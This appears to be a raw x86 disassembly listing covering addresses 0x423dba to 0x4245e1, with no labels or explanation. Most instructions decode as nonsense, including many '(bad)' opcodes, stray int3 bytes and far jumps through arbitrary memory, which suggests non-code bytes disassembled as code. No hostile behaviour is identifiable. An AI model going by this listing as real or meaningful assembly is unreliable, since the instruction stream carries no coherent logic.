  423dba:	call   FWORD PTR [edi]
  423dbc:	(bad)  
  423dbe:	xchg   esi,eax
  423dbf:	(bad)  
  423dc0:	cld    
  423dc1:	(bad)  
  423dc2:	call   FWORD PTR [esi]
  423dc4:	dec    esp
  423dc5:	add    DWORD PTR [ebx+0x46ff],0xffffffee
  423dcc:	sahf   
  423dcd:	add    cl,bl
  423dcf:	add    BYTE PTR [edi+0x0],dl
  423dd2:	jmp    FWORD PTR [edi]
  423dd4:	or     esp,ecx
  423dd6:	push   eax
  423dd7:	int3   
  423dd8:	pop    ds
  423dd9:	(bad)  
  423dda:	(bad)  
  423ddb:	js     0x423d98
  423ddd:	int3   
  423dde:	inc    ebp
  423ddf:	dec    DWORD PTR [eax]
  423de1:	(bad)  
  423de2:	jmp    DWORD PTR [eax+0x9]
  423de5:	jmp    DWORD PTR [ebx+eax*4]
  423de8:	rol    DWORD PTR [ebx+0xb9c200],1
  423dee:	pop    edx
  423def:	add    BYTE PTR [ebp+0x36f78383],bl
  423df5:	add    BYTE PTR [edx-0xc734],bl
  423dfb:	aad    0xc4
  423dfd:	inc    DWORD PTR [ecx]
  423dff:	add    BYTE PTR [ebx],bl
  423e01:	add    BYTE PTR [eax],al
  423e03:	lds    edx,FWORD PTR [esi]
  423e05:	call   DWORD PTR [eax+eax*1-0x27]
  423e09:	add    BYTE PTR [eax],al
  423e0b:	mov    ch,0xca
  423e0d:	jmp    edx
  423e0f:	inc    ebp
  423e11:	add    BYTE PTR [eax],al
  423e13:	ja     0x423e34
  423e15:	call   DWORD PTR [edi]
  423e17:	call   DWORD PTR [edi+edi*8]
  423e1a:	(bad)  
  423e1b:	cmp    BYTE PTR [edi-0x34],dl
  423e1e:	sub    BYTE PTR [eax],al
  423e20:	int    0x0
  423e22:	push   DWORD PTR [ebp-0x2a]
  423e25:	add    BYTE PTR [edi],ah
  423e27:	sbb    ecx,0xffffff83
  423e2a:	call   DWORD PTR [ebx]
  423e2c:	sahf   
  423e2d:	mov    DWORD PTR [ecx-0x7c00a401],esp
  423e33:	mov    dh,0xbd
  423e35:	inc    DWORD PTR [ecx-0x1]
  423e38:	jb     0x423e06
  423e3a:	jmp    FWORD PTR [ecx-0x76b500a0]
  423e40:	lds    eax,FWORD PTR [eax]
  423e42:	int3   
  423e43:	pop    ebp
  423e44:	dec    ebp
  423e45:	add    al,dl
  423e47:	add    BYTE PTR [edi+0x30a0ccff],dh
  423e4d:	jmp    DWORD PTR [ebp-0x1]
  423e50:	xor    esp,ecx
  423e52:	push   DWORD PTR [edx+0x60]
  423e55:	call   FWORD PTR [esi-0x7c2b00]
  423e5b:	es dec ecx
  423e5d:	int3   
  423e5e:	inc    esi
  423e5f:	add    BYTE PTR [eax-0x2b870100],ah
  423e65:	(bad)  
  423e66:	cmp    eax,DWORD PTR [ebx+0x4500cc53]
  423e6c:	adc    al,0x83
  423e6e:	das    
  423e6f:	add    dl,bl
  423e71:	inc    DWORD PTR [ebx+0x64cca26b]
  423e77:	xor    DWORD PTR [eax-0x284f0001],0xffffffff
  423e7e:	mov    ?,edi
  423e80:	stos   DWORD PTR es:[edi],eax
  423e81:	dec    esp
  423e83:	pop    ecx
  423e84:	ror    DWORD PTR [ecx+0x4fff51],cl
  423e8a:	add    BYTE PTR [ebx],ch
  423e8c:	mov    esi,0xbfff04cc
  423e91:	(bad)  
  423e92:	call   FWORD PTR [ebp+eiz*1-0x167c8b00]
  423e99:	cmp    edi,0xffffffec
  423e9c:	fwait
  423e9d:	call   DWORD PTR [ecx]
  423e9f:	int3   
  423ea0:	pop    es
  423ea1:	add    BYTE PTR [ecx-0x537c7766],cl
  423ea7:	call   DWORD PTR ds:0x8334ff83
  423ead:	push   DWORD PTR [ebx-0x7d]
  423eb0:	push   edi
  423eb1:	inc    DWORD PTR [eax]
  423eb3:	lods   eax,DWORD PTR ds:[esi]
  423eb4:	adc    al,0xff
  423eb6:	fld    DWORD PTR [eax]
  423eb8:	sbb    esp,ecx
  423eba:	jmp    FWORD PTR [ebp-0x7cf8ffcc]
  423ec0:	xchg   edi,eax
  423ec1:	add    ah,cl
  423ec3:	shl    BYTE PTR [esi],0xff
  423ec6:	mov    bl,0x83
  423ec8:	mov    al,0xff
  423eca:	jmp    DWORD PTR [esi+0x87ff50]
  423ed0:	push   0xffffffff
  423ed2:	dec    eax
  423ed4:	mov    dh,0x89
  423ed6:	in     eax,dx
  423ed7:	add    BYTE PTR [esp+ecx*8],bh
  423eda:	and    DWORD PTR [edi+ebx*2],0xffffff83
  423ede:	or     edi,edi
  423ee0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ee1:	inc    DWORD PTR [eax]
  423ee3:	sub    al,0x9
  423ee5:	jmp    DWORD PTR [esi-0x1]
  423ee8:	or     edi,edi
  423eea:	int3   
  423eeb:	test   eax,0x14ff29
  423ef0:	jle    0x423ef1
  423ef2:	add    BYTE PTR [ebx],dl
  423ef4:	ins    BYTE PTR es:[edi],dx
  423ef5:	mov    DWORD PTR [ebp+0xcc8083],ebx
  423efb:	mov    gs,eax
  423efd:	sbb    DWORD PTR ds:0xff3789,0xffffffe5
  423f04:	popa   
  423f05:	(bad)  
  423f06:	mov    ebp,0x83ffeeff
  423f0b:	dec    ecx
  423f0c:	cmp    eax,0x43ffa789
  423f11:	(bad)  
  423f12:	push   DWORD PTR [esi+0x8900dd]
  423f18:	sbb    eax,0x92f18300
  423f1d:	call   FWORD PTR [eax]
  423f1f:	mov    esi,ecx
  423f21:	(bad)  
  423f22:	call   FWORD PTR [ecx-0x14ff16]
  423f28:	xor    bh,bh
  423f2a:	mov    DWORD PTR [ebx-0x1b337a],edx
  423f30:	popf   
  423f31:	add    BYTE PTR [ebx+0x4900683e],al
  423f37:	call   DWORD PTR [eax-0x44b6007d]
  423f3d:	(bad)  
  423f3e:	jg     0x423f3f
  423f40:	rol    DWORD PTR [ebx-0xe82b01],1
  423f46:	test   al,0xcc
  423f48:	lods   al,BYTE PTR ds:[esi]
  423f49:	add    BYTE PTR [ecx-0x5333cc95],cl
  423f4f:	(bad)  
  423f50:	jmp    0x423f52
  423f52:	add    BYTE PTR [eax-0x6b],bh
  423f55:	jmp    DWORD PTR [ebp-0x337600]
  423f5b:	cmp    DWORD PTR [ebx],0x71830383
  423f61:	add    ah,cl
  423f63:	xor    al,0x62
  423f65:	call   DWORD PTR [esi-0x7d01]
  423f6b:	pop    ds
  423f6c:	jmp    0x3c41d670
  423f71:	add    BYTE PTR [ebx-0xa0088d5],al
  423f77:	cmp    DWORD PTR [ebx+0x0],0xffffffff
  423f7b:	ins    DWORD PTR es:[edi],dx
  423f7c:	call   0xe8429c80
  423f81:	add    BYTE PTR [ecx-0x4576fb8d],cl
  423f87:	call   eax
  423f89:	mov    edi,edi
  423f8b:	inc    cx
  423f8d:	add    BYTE PTR [ebx-0x331601],dh
  423f93:	sbb    eax,0x6fff94
  423f98:	gs (bad) 
  423f9a:	(bad)  
  423f9b:	mov    esi,0xffebff9a
  423fa0:	out    dx,eax
  423fa1:	(bad)  
  423fa2:	(bad)  
  423fa3:	mov    eax,0x8c838c
  423fa8:	or     eax,0x1608383
  423fad:	inc    edx
  423faf:	add    BYTE PTR [ecx+0x5e810000],ch
  423fb5:	sbb    DWORD PTR [esi-0x1],0xc
  423fb9:	(bad)  
  423fba:	call   DWORD PTR [ecx]
  423fbc:	xor    bh,bh
  423fbe:	jb     0x423fbf
  423fc0:	cs add bh,bh
  423fc3:	add    DWORD PTR [eax+0x0],ecx
  423fc6:	jl     0x423fc7
  423fc8:	sub    al,0x89
  423fca:	add    bl,ah
  423fcc:	retf   
  423fcd:	add    dl,bh
  423fcf:	int3   
  423fd0:	test   edi,edi
  423fd2:	add    DWORD PTR [ebx+0x45],0xffffffff
  423fd6:	mov    al,0xff
  423fd8:	adc    DWORD PTR [eax],eax
  423fda:	(bad)  
  423fdb:	jmp    0x423fad
  423fdd:	add    BYTE PTR [ebx-0xf401],ch
  423fe3:	fs jne 0x423fe5
  423fe6:	fild   WORD PTR [eax]
  423fe8:	cmp    al,0x83
  423fea:	add    BYTE PTR [eax-0x761fff24],dl
  423ff0:	jbe    0x423fbe
  423ff2:	add    dl,dl
  423ff4:	stos   BYTE PTR es:[edi],al
  423ff5:	(bad)  
  423ff6:	fcos   
  423ff8:	mov    eax,ds:0xdeeb00ff
  423ffd:	push   esp
  423fff:	add    BYTE PTR [eax-0x7d],ch
  424002:	dec    DWORD PTR [esi]
  424004:	add    BYTE PTR [ebx-0x3317ff08],0xff
  42400b:	inc    esp
  42400c:	leave  
  42400d:	adc    ebx,0xffffff89
  424010:	js     0x424012
  424012:	add    BYTE PTR [ebp+0x65],dl
  424015:	dec    DWORD PTR [eax+0xcca200]
  42401b:	(bad)  ds:0xe8315ff
  424021:	int3   
  424022:	jmp    edi
  424024:	(bad)  
  424025:	add    bl,dl
  424027:	and    DWORD PTR [edi+0x0],0xffffffff
  42402b:	adc    al,0x89
  42402d:	jmp    edx
  42402f:	(bad)  
  424030:	jmp    0x52cc:0xc69883ff
  424037:	(bad)  
  424038:	cmp    ecx,esp
  42403a:	add    BYTE PTR [edx+0x7a],bh
  42403d:	mov    eax,edi
  42403f:	add    BYTE PTR [eax-0x1],ah
  424042:	(bad)  
  424043:	std    
  424044:	mov    dl,0x83
  424046:	sbb    bh,bh
  424048:	sbb    eax,0xe809ff00
  42404d:	or     DWORD PTR [esi-0x7d],0x4d
  424051:	add    bh,bh
  424053:	sub    eax,ecx
  424055:	call   FWORD PTR [eax+eax*1+0x69]
  424059:	cmp    edi,0xffffff94
  42405c:	mov    ds:0x1effc400,eax
  424061:	mov    edi,edi
  424063:	btc    DWORD PTR [eax],eax
  424066:	pop    esp
  424067:	add    dh,al
  424069:	inc    DWORD PTR [eax]
  42406b:	shr    BYTE PTR [ebx],1
  42406d:	mov    DWORD PTR [esi-0x339901],edx
  424073:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424074:	or     eax,0xb5ffb783
  424079:	mov    DWORD PTR [eax],eax
  42407b:	test   eax,0xcc67899b
  424080:	(bad)  
  424082:	jmp    DWORD PTR [edi-0xe90055]
  424088:	add    DWORD PTR [eax],0xffffff83
  42408b:	dec    edx
  42408c:	pop    ds
  42408d:	(bad)  
  42408e:	fild   DWORD PTR [eax]
  424090:	stc    
  424091:	(bad)  
  424092:	(bad)  
  424093:	jmp    0xff8a0d36
  424098:	jae    0x424099
  42409a:	inc    ecx
  42409c:	jnp    0x42409d
  42409e:	int    0x83
  4240a0:	cmp    cl,ah
  4240a2:	int3   
  4240a3:	ds (bad) 
  4240a6:	push   ebp
  4240a7:	call   ebx
  4240a9:	add    BYTE PTR [ebx-0x1eff3e7c],al
  4240af:	add    BYTE PTR [edi+edi*8],ah
  4240b2:	mov    DWORD PTR [ecx],eax
  4240b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4240b5:	dec    edx
  4240b7:	dec    edi
  4240b9:	(bad)  
  4240ba:	dec    DWORD PTR [eax]
  4240bc:	mov    eax,ds:0x4a007300
  4240c1:	add    BYTE PTR [ebx-0x12001c8a],al
  4240c7:	push   eax
  4240c9:	inc    DWORD PTR [eax]
  4240cb:	call   0xffc6416b
  4240d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240d1:	add    bh,bh
  4240d3:	jmp    0x4240c1
  4240d5:	call   DWORD PTR [ebx+0x0]
  4240d8:	cwde   
  4240d9:	int3   
  4240da:	dec    DWORD PTR [ebx-0x7cb8ffdb]
  4240e0:	sub    al,0x0
  4240e2:	jmp    FWORD PTR [ecx]
  4240e4:	scas   eax,DWORD PTR es:[edi]
  4240e5:	adc    DWORD PTR [ecx],0xffffffff
  4240e8:	leave  
  4240e9:	add    BYTE PTR [eax],al
  4240eb:	cdq    
  4240ec:	and    eax,0xdeccc0ff
  4240f1:	inc    DWORD PTR [ebx+0x14007c00]
  4240f7:	call   FWORD PTR [eax+0x0]
  4240fa:	xor    DWORD PTR [edx+0x75],0x0
  4240fe:	xchg   ecx,eax
  4240ff:	add    bh,al
  424101:	inc    DWORD PTR [eax]
  424103:	lds    ecx,FWORD PTR [edi+edi*8+0x8483d0]
  42410a:	call   DWORD PTR [esi-0xad0058]
  424110:	mov    es,WORD PTR [eax]
  424112:	and    DWORD PTR ds:0x8ccc13,0xffffffe8
  424119:	add    DWORD PTR [ebx-0x41ff97ac],0xffffffcc
  424120:	(bad)  
  424121:	inc    DWORD PTR [ebx-0x2e00a7be]
  424127:	push   ebx
  424129:	add    bh,bh
  42412b:	pop    edx
  42412c:	pop    esp
  42412d:	inc    DWORD PTR [ebx+0x836700]
  424133:	sahf   
  424134:	push   ecx
  424135:	(bad)  
  424136:	add    BYTE PTR ds:[ebp+0x0],ch
  42413a:	add    BYTE PTR [ecx],ch
  42413c:	jmp    0x42413d
  42413e:	pushf  
  42413f:	inc    DWORD PTR [ebp-0xd930001]
  424145:	add    BYTE PTR [ebx+0x899700],bh
  42414b:	in     eax,0xf7
  42414d:	add    BYTE PTR [ebx-0x7cff9001],bl
  424153:	fcomp  DWORD PTR [ecx+0x6500f4ff]
  424159:	inc    DWORD PTR [eax]
  42415b:	jp     0x4241d6
  42415d:	add    BYTE PTR [edi],bl
  42415f:	add    ah,bl
  424161:	cmp    edi,0xb
  424164:	out    dx,al
  424165:	add    BYTE PTR [eax-0xfd7d],dh
  42416b:	mov    dl,0x7d
  42416d:	add    esi,0x0
  424170:	push   cs
  424171:	int3   
  424172:	int3   
  424173:	xchg   edi,eax
  424174:	dec    eax
  424175:	inc    DWORD PTR ds:0xcc836aff
  42417b:	jmp    0x42416a
  42417d:	mov    DWORD PTR [edi+edi*8],ebp
  424180:	xchg   edi,eax
  424181:	add    bh,bh
  424183:	mov    DWORD PTR [ebx],ecx
  424185:	mov    DWORD PTR [edx],ebp
  424187:	inc    DWORD PTR [ebp+0x84dff83]
  42418d:	jmp    DWORD PTR [ebx-0xff6300]
  424193:	push   ss
  424194:	inc    edi
  424195:	(bad)  
  424196:	std    
  424197:	dec    edx
  424199:	add    BYTE PTR [eax],al
  42419b:	adc    al,0xbf
  42419d:	(bad)  
  42419e:	clc    
  42419f:	call   DWORD PTR [edx]
  4241a1:	add    ah,cl
  4241a3:	sbb    eax,0xff62ff42
  4241a8:	stos   DWORD PTR es:[edi],eax
  4241a9:	inc    DWORD PTR [eax]
  4241ab:	and    BYTE PTR [edi+edi*8+0x71],0x0
  4241b0:	ins    BYTE PTR es:[edi],dx
  4241b1:	(bad)  
  4241b2:	jmp    eax
  4241b4:	loopne 0x4241b5
  4241b6:	stc    
  4241b7:	push   esi
  4241b9:	dec    DWORD PTR [ecx+0x1d83c885]
  4241bf:	add    BYTE PTR [ecx-0xebff77],bl
  4241c5:	push   DWORD PTR [edx-0x34]
  4241c8:	call   0x1e004256
  4241cd:	(bad)  
  4241ce:	(bad)  
  4241cf:	call   DWORD PTR [ebx-0x1]
  4241d2:	add    BYTE PTR [ebp-0x537ca9],al
  4241d8:	mov    BYTE PTR [eax],al
  4241da:	(bad)  
  4241db:	out    dx,eax
  4241dc:	(bad)  
  4241de:	cmp    edi,edi
  4241e0:	inc    eax
  4241e1:	or     esp,0x67
  4241e4:	or     eax,DWORD PTR [ebx-0x9fffe7]
  4241ea:	add    DWORD PTR [ebp-0x2d],0xffffff83
  4241ee:	jg     0x4241ef
  4241f0:	or     BYTE PTR [ecx-0x338ffc01],0x19
  4241f7:	inc    DWORD PTR [edi]
  4241f9:	int3   
  4241fa:	(bad)  
  4241fb:	cld    
  4241fc:	mov    esp,cs
  4241fe:	sub    BYTE PTR [eax],al
  424200:	out    0xff,eax
  424202:	int3   
  424203:	sbb    BYTE PTR [ebp-0x1],dl
  424206:	sbb    bh,bh
  424208:	mov    edi,edi
  42420a:	add    BYTE PTR [ebx-0xe4006b],bh
  424210:	xchg   ebp,eax
  424211:	add    bh,bh
  424213:	xchg   esi,eax
  424214:	mov    ds:0xe4ff5000,al
  424219:	(bad)  
  42421a:	inc    DWORD PTR [eax]
  42421c:	ss int3 
  42421e:	and    al,0x83
  424220:	mov    al,BYTE PTR [ebx-0x33473b01]
  424226:	sbb    cl,BYTE PTR [ecx+0x30ff839c]
  42422c:	sbb    edi,edi
  42422e:	pop    ebx
  42422f:	(bad)  
  424230:	jnp    0x424231
  424232:	call   DWORD PTR [ecx]
  424234:	lea    eax,[eax]
  424236:	adc    al,0xff
  424238:	mov    DWORD PTR [ebx-0x51c800],eax
  42423e:	hlt    
  42423f:	add    BYTE PTR [eax],bh
  424241:	add    BYTE PTR [eax],al
  424243:	jge    0x4241fc
  424245:	add    DWORD PTR [ebx],0x0
  424248:	(bad)  
  42424a:	sub    DWORD PTR [eax+0x0],0x0
  42424e:	pop    eax
  42424f:	mov    ecx,esp
  424251:	(bad)  
  424252:	push   ecx
  424254:	leave  
  424255:	call   FWORD PTR [esi]
  424257:	(bad)  
  424258:	sti    
  424259:	dec    DWORD PTR [ecx+0x6600c314]
  42425f:	inc    DWORD PTR [eax+0x7dbd0000]
  424265:	call   FWORD PTR [ebx+0x0]
  424268:	mov    ds:0xb4ce83ff,al
  42426d:	(bad)  
  42426e:	jle    0x424270
  424270:	sub    eax,DWORD PTR [eax]
  424272:	dec    ebx
  424274:	push   cs
  424275:	push   DWORD PTR [ebx+0xffccff]
  42427b:	push   0xffffff90
  42427d:	add    BYTE PTR [edx+0x0],bl
  424280:	mov    ecx,DWORD PTR [ecx-0x71f47d]
  424286:	cwde   
  424287:	sub    DWORD PTR [edx],0x0
  42428a:	inc    DWORD PTR [edi+0x5d]
  42428d:	mov    DWORD PTR [ebx],edi
  42428f:	call   FWORD PTR [esi+0x5dd6cc00]
  424295:	mov    DWORD PTR [eax+0x0],esp
  424298:	into   
  424299:	mov    edi,edi
  42429b:	lahf   
  42429c:	fdiv   st(7),st
  42429e:	dec    esp
  42429f:	add    ch,ah
  4242a1:	inc    DWORD PTR [eax]
  4242a3:	bound  esi,QWORD PTR [eax-0x327cfa34]
  4242a9:	(bad)  
  4242aa:	(bad)  
  4242ab:	mov    eax,0xff3dff26
  4242b0:	(bad)  
  4242b1:	(bad)  
  4242b2:	call   FWORD PTR [ebx]
  4242b4:	push   eax
  4242b5:	mov    DWORD PTR [edi],ebp
  4242b7:	add    dh,bh
  4242b9:	inc    DWORD PTR [eax]
  4242bb:	imul   edi,DWORD PTR [ebx-0x27004500],0x0
  4242c2:	(bad)  
  4242c3:	sti    
  4242c4:	mov    eax,0xef00c600
  4242c9:	int3   
  4242ca:	call   FWORD PTR [edi-0x937c96]
  4242d0:	xchg   esi,eax
  4242d1:	inc    DWORD PTR [ebx+0x28ffec7f]
  4242d7:	int3   
  4242d8:	addr16 add bh,bh
  4242db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4242dc:	nop
  4242dd:	(bad)  
  4242de:	jmp    0x4242df
  4242e0:	idiv   bh
  4242e2:	int3   
  4242e3:	xchg   edx,eax
  4242e4:	std    
  4242e5:	push   DWORD PTR [ecx-0x1]
  4242e8:	dec    DWORD PTR [bx+di-0x20f1]
  4242ed:	and    ebx,0xffffffff
  4242f0:	(bad)  
  4242f2:	jmp    FWORD PTR [esi+0x55cc91]
  4242f8:	mov    esi,0xaa6bff83
  4242fd:	add    BYTE PTR [eax-0x1],ch
  424300:	test   al,0xcc
  424302:	dec    DWORD PTR [edx-0x5c]
  424305:	add    al,al
  424307:	mov    DWORD PTR [edi-0x1],edx
  42430a:	mov    DWORD PTR [edx],ecx
  42430c:	cmp    BYTE PTR [eax],al
  42430e:	iret   
  42430f:	jmp    FWORD PTR [ecx-0x7d]
  424312:	push   eax
  424314:	cmp    bh,bh
  424316:	test   edi,edi
  424318:	sar    edi,cl
  42431a:	mov    DWORD PTR [ebx],esi
  42431c:	jns    0x4242ea
  42431e:	and    DWORD PTR [eax],eax
  424320:	or     eax,DWORD PTR [eax]
  424322:	sub    edi,0x7c
  424325:	add    BYTE PTR [ebp-0x76006501],ch
  42432b:	xchg   ah,cl
  42432d:	inc    DWORD PTR [ecx-0x7cef7d]
  424333:	cli    
  424334:	jl     0x424335
  424336:	clc    
  424337:	mov    DWORD PTR [edi+edi*8],ebp
  42433a:	jmp    FWORD PTR [esi+0x7b]
  42433d:	(bad)  
  42433e:	cli    
  42433f:	dec    DWORD PTR [eax-0x1]
  424342:	inc    edx
  424344:	xchg   ecx,eax
  424345:	mov    DWORD PTR [ebp+0x0],esp
  424348:	nop
  424349:	cmp    edi,0xffffffcd
  42434c:	loopne 0x42434d
  42434e:	fcos   
  424350:	pop    ecx
  424351:	(bad)  
  424352:	push   DWORD PTR [esi]
  424354:	(bad)  
  424355:	dec    DWORD PTR [ebp+0x0]
  424358:	bswap  esp
  42435a:	(bad)  
  42435b:	mov    ecx,0xff968378
  424360:	out    dx,al
  424361:	add    DWORD PTR [ebx-0x2c00914a],0xffffffff
  424368:	(bad)  
  424369:	dec    esp
  42436b:	cmp    bh,BYTE PTR [edi+0x6b0002cc]
  424371:	add    ah,cl
  424373:	fsub   QWORD PTR [edi-0x2f33b300]
  424379:	cmp    edi,0x7
  42437c:	xor    al,0x83
  42437e:	sub    eax,0x83cceaff
  424383:	mov    eax,ds:0x83d0ff7d
  424388:	fdivr  st,st(7)
  42438a:	(bad)  
  42438b:	mov    ecx,0x8304fff0
  424390:	jle    0x424315
  424392:	int3   
  424393:	and    eax,0x83880038
  424398:	loop   0x42439a
  42439a:	add    BYTE PTR ds:0x89fb009e,ch
  4243a0:	push   0xc6e700ff
  4243a5:	(bad)  
  4243a6:	fiadd  DWORD PTR [eax]
  4243a8:	(bad)  
  4243a9:	(bad)  
  4243aa:	jmp    FWORD PTR [ecx+0x75]
  4243ad:	add    DWORD PTR [esi],0xffffffcc
  4243b0:	out    dx,al
  4243b1:	or     DWORD PTR [ecx+0x5fccf193],0xffffffff
  4243b8:	das    
  4243b9:	add    BYTE PTR [eax],al
  4243bb:	cmp    DWORD PTR [edi],edi
  4243bd:	add    al,ah
  4243bf:	add    BYTE PTR ds:0xbc58ffff,cl
  4243c5:	int3   
  4243c6:	repnz add BYTE PTR [esi+0x0],al
  4243ca:	add    eax,0x27
  4243cd:	(bad)  
  4243ce:	mov    ecx,0xffff4a83
  4243d3:	and    al,0x2b
  4243d5:	adc    DWORD PTR [edi+edi*8],0xffffffe1
  4243d9:	add    bh,bh
  4243db:	dec    ebp
  4243dc:	sub    bh,bh
  4243de:	sar    bh,0xd7
  4243e1:	(bad)  
  4243e2:	(bad)  
  4243e3:	out    dx,eax
  4243e4:	or     DWORD PTR [eax],eax
  4243e6:	ror    DWORD PTR [ecx+0x41cc003f],cl
  4243ec:	push   ss
  4243ed:	add    BYTE PTR [edi+edi*8-0x38],bl
  4243f1:	add    DWORD PTR [eax],0xffffffba
  4243f4:	push   0xffffffcc
  4243f6:	mov    bh,0xff
  4243f8:	adc    DWORD PTR [ecx+0x435cff],ecx
  4243fe:	pop    edi
  4243ff:	(bad)  
  424400:	jns    0x424401
  424402:	add    al,dl
  424404:	mov    ds:0x39ffa000,eax
  424409:	int3   
  42440a:	(bad)  
  42440b:	mov    ebp,0x76ffc0
  424410:	fmul   QWORD PTR [ecx+0xa57100]
  424416:	cmp    bh,0x58
  424419:	dec    DWORD PTR [ecx+0xff0133]
  42441f:	add    BYTE PTR [edi-0x77],dl
  424422:	jmp    FWORD PTR [esi+0xdcfff9]
  424428:	push   ss
  424429:	dec    esp
  42442b:	je     0x4243d1
  42442d:	add    BYTE PTR [eax],ah
  42442f:	jmp    FWORD PTR [eax-0x1]
  424432:	sub    esp,0xffffffec
  424435:	int3   
  424436:	stos   BYTE PTR es:[edi],al
  424437:	call   DWORD PTR [eax]
  424439:	add    BYTE PTR [eax],al
  42443b:	scas   al,BYTE PTR es:[edi]
  42443c:	je     0x42443d
  42443e:	lods   al,BYTE PTR ds:[esi]
  42443f:	add    BYTE PTR [edi-0x1],bh
  424442:	add    BYTE PTR [ecx-0x7c8d00f4],cl
  424448:	in     al,0x0
  42444a:	dec    eax
  42444c:	xchg   ebp,eax
  42444d:	push   DWORD PTR [edx]
  42444f:	int3   
  424450:	pop    ss
  424451:	add    bh,bh
  424453:	push   cs
  424454:	mov    edx,0xd70076ff
  424459:	int3   
  42445a:	int3   
  42445b:	ss xchg esp,eax
  42445d:	add    BYTE PTR [eax-0x1],dh
  424460:	mov    edi,?
  424462:	add    BYTE PTR [eax],dl
  424464:	mov    eax,ds:0xbb00f3ff
  424469:	(bad)  
  42446a:	jmp    DWORD PTR [edx]
  42446c:	xor    bh,bh
  42446e:	dec    esp
  42446f:	xor    DWORD PTR [esi],0xffffffff
  424472:	(bad)  
  424473:	aas    
  424474:	(bad)  
  424477:	call   DWORD PTR [eax]
  424479:	mov    edi,edi
  42447b:	dec    ecx
  42447c:	cmp    BYTE PTR [eax],al
  42447e:	pop    edx
  42447f:	add    BYTE PTR [ecx-0x7d],bl
  424482:	add    BYTE PTR [edi],al
  424484:	fwait
  424485:	(bad)  
  424486:	fxch   st(4)
  424488:	repnz cmp edi,0xffffffe3
  42448c:	dec    BYTE PTR [ecx-0xe80092]
  424492:	(bad)  
  424493:	jp     0x4244f1
  424495:	jmp    FWORD PTR [esi-0x77]
  424498:	mov    ecx,0xebf0000
  42449d:	dec    DWORD PTR [edx-0xffd900]
  4244a3:	in     al,0xe1
  4244a5:	inc    DWORD PTR [eax+eax*1-0x1f]
  4244a9:	(bad)  
  4244aa:	push   DWORD PTR [ecx+0x5d]
  4244ad:	cmp    DWORD PTR [ebp+0xff6483],0x9
  4244b4:	je     0x4244b6
  4244b6:	xchg   ebx,eax
  4244b7:	int3   
  4244b8:	scas   eax,DWORD PTR es:[edi]
  4244b9:	(bad)  
  4244ba:	(bad)  
  4244bb:	mov    ecx,0xff798378
  4244c0:	xor    bh,bh
  4244c2:	dec    DWORD PTR [ecx-0x1e]
  4244c5:	dec    DWORD PTR [edi+edi*8-0x14]
  4244c9:	(bad)  
  4244ca:	jmp    DWORD PTR [ecx]
  4244cc:	jb     0x4244cd
  4244ce:	mov    cs,esp
  4244d0:	ds add bh,bh
  4244d3:	xchg   DWORD PTR [ebx+eax*4-0x339500de],esp
  4244da:	inc    ebx
  4244dc:	push   cs
  4244dd:	add    cl,bl
  4244df:	inc    DWORD PTR [ecx+0x0]
  4244e2:	add    BYTE PTR [ecx-0x7c1100fc],dh
  4244e8:	push   ss
  4244e9:	dec    esp
  4244eb:	mov    ch,ah
  4244ed:	int3   
  4244ee:	test   eax,0xff833f83
  4244f3:	das    
  4244f4:	mov    ebp,0x9a0015cc
  4244f9:	mov    DWORD PTR [eax],eax
  4244fb:	retf   
  4244fc:	imul   eax,DWORD PTR [eax],0x768916
  424502:	jmp    DWORD PTR [edi-0x9b330b]
  424508:	add    BYTE PTR [ebx-0xe65200],0xb3
  42450f:	sub    DWORD PTR [ecx-0x1],0xffffffff
  424513:	xchg   edi,eax
  424514:	pop    ss
  424515:	mov    DWORD PTR [ebx],eax
  424517:	dec    DWORD PTR [esi]
  424519:	mov    DWORD PTR [eax],eax
  42451b:	dec    edx
  42451c:	xor    eax,0x583dd00
  424521:	add    DWORD PTR [eax],0xffffffef
  424524:	mov    esp,0x54ff4700
  424529:	or     esp,0xffffffe2
  42452c:	jno    0x42452e
  42452e:	pop    edx
  42452f:	jmp    esp
  424531:	add    BYTE PTR [ebx+0x5dff13eb],al
  424537:	push   ebp
  424539:	(bad)  
  42453a:	(bad)  
  42453b:	cmp    al,0x52
  42453d:	add    BYTE PTR ds:0xff003400,ah
  424543:	cli    
  424544:	inc    ebx
  424545:	jmp    DWORD PTR [ebx]
  424547:	adc    DWORD PTR [edi-0x1],0x0
  42454b:	xor    al,0x52
  42454d:	add    BYTE PTR [eax-0x7d],ch
  424550:	dec    ebp
  424551:	mov    edi,edi
  424553:	add    eax,0xffc90008
  424558:	aam    0xff
  42455a:	call   DWORD PTR [esi-0xd476fd]
  424560:	add    DWORD PTR [ebx-0x8a4534],0xffffff91
  424567:	mov    DWORD PTR ds:0x3701ff00,ebp
  42456d:	mov    DWORD PTR [edx-0xffba01],esi
  424573:	mov    ah,0x2
  424575:	int3   
  424576:	cdq    
  424577:	sub    esp,0xffffffff
  42457a:	call   ebx
  42457c:	inc    ecx
  42457d:	mov    DWORD PTR [edi+0xff03ff],edx
  424583:	sub    al,0x48
  424585:	int3   
  424586:	test   al,0xff
  424588:	dec    esp
  424589:	(bad)  
  42458a:	dec    DWORD PTR [eax+ecx*1-0x6700e577]
  424591:	(bad)  
  424592:	inc    DWORD PTR [esi+0xe008a]
  424598:	sahf   
  424599:	mov    edi,edi
  42459b:	mov    ecx,ss
  42459d:	sub    DWORD PTR [edi-0x34],0xffffffbc
  4245a1:	add    bh,bh
  4245a3:	and    esi,DWORD PTR [eax]
  4245a5:	add    DWORD PTR [ebp+0xffab89],0x7e
  4245ac:	call   0x904186b0
  4245b1:	inc    DWORD PTR [eax]
  4245b3:	lahf   
  4245b4:	xchg   esp,eax
  4245b5:	call   DWORD PTR [ebx]
  4245b7:	int3   
  4245b8:	cmp    al,0xff
  4245ba:	int3   
  4245bb:	mov    ch,0x4d
  4245bd:	(bad)  
  4245be:	jmp    0xacd7:0xb7cc
  4245c5:	jmp    DWORD PTR [esi-0xfffc01]
  4245cb:	cmp    BYTE PTR [edi-0x1],0xfe
  4245cf:	push   esp
  4245d1:	inc    DWORD PTR [eax]
  4245d3:	or     BYTE PTR [edi-0x1],al
  4245d6:	sbb    bh,bh
  4245d8:	jns    0x42455d
  4245da:	jmp    DWORD PTR [ecx-0x5b]
  4245dd:	add    ah,al
  4245df:	add    cl,cl
  4245e1:	add    bh,bh
